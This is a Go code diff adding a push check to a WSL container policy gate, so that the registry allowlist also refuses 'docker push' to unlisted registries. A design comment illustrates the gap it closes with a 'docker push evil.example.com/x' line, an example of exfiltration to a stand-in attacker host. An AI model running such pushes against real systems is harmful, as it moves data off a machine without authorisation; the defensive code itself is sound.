@@ -6,6 +6,7 @@ import (
 
 	"github.com/wslkit/skrog/internal/apibody"
 	"github.com/wslkit/skrog/internal/imageref"
+	"github.com/wslkit/skrog/internal/pipeproxy"
 )
 
 // PolicyGate enforces the administrator's WSL container policy at Skrog's pipe,
@@ -142,6 +143,54 @@ func (g *PolicyGate) DenyBuild() (string, bool) {
 		"Skrog refuses the build; `wslc image build` instead enforces the allowlist " +
 		"per source inside BuildKit, which Skrog cannot do at the pipe", true
 }
+
+// DenyPush judges `docker push` and `docker plugin push`.
+//
+// A registry allowlist gating only inbound traffic controls what may enter the
+// machine and says nothing about what leaves it — and leaving is the direction
+// that moves data off it. Before this, with an allowlist deployed:
+//
+//	docker pull evil.example.com/x    refused
+//	docker push evil.example.com/x    allowed
+//
+// Two readings of "registry allowlist" were available. The supply-chain
+// reading says it controls what code may ENTER, so push is out of scope. The
+// data-exfiltration reading says it governs which registries this machine
+// speaks to at all. WSL settles it: `wslc push` refuses a blocked registry, so
+// gating here matches them rather than Skrog inventing a second answer — the
+// rule this whole gate has followed since #322.
+//
+// Worth being straight about the limit, which is the same one #343 documents:
+// this is admission control at the Docker API, not a network control. A
+// container can reach any registry it likes regardless. Gating push raises the
+// bar for an accident, not for a determined local user.
+func (g *PolicyGate) DenyPush(image string) (string, bool) {
+	p := g.policies()
+	server, ok := imageref.Registry(image)
+	if !ok {
+		if p.HasRegistryAllowlist() {
+			return fmt.Sprintf(
+				"image reference %q cannot be attributed to a registry, and "+
+					"WSLContainerRegistryAllowlist is in force on this machine", image), true
+		}
+		return "", false
+	}
+	if p.RegistryAllowed(server) {
+		return "", false
+	}
+	return fmt.Sprintf(
+		"WSLContainerRegistryAllowlist does not permit pushing to %q (image %q); "+
+			"this machine's WSL policy allows: %s",
+		server, image, strings.Join(p.RegistryAllowlist, ", ")), true
+}
+
+// The handler reaches ImageGate through a type assertion, so a gate one method
+// short silently stops being judged instead of failing to build. These turn
+// that into a compile error.
+var (
+	_ pipeproxy.Gate      = (*PolicyGate)(nil)
+	_ pipeproxy.ImageGate = (*PolicyGate)(nil)
+)
 
 // truthyPriv accepts the shapes a JSON decode can produce for a boolean the
 // daemon will read as true. A bare type assertion to bool missed `"Privileged":
